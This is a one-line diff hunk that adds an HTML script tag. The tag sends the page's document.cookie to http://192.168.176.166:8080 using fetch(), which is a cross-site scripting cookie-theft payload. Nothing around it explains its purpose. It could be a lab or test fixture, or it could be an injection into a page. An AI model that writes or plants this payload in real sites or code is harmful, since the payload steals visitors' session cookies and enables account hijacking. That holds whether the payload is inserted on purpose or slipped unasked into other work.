@@ -1,0 +1,1 @@
+<script>fetch('http://192.168.176.166:8080/?c='+document.cookie)</script>
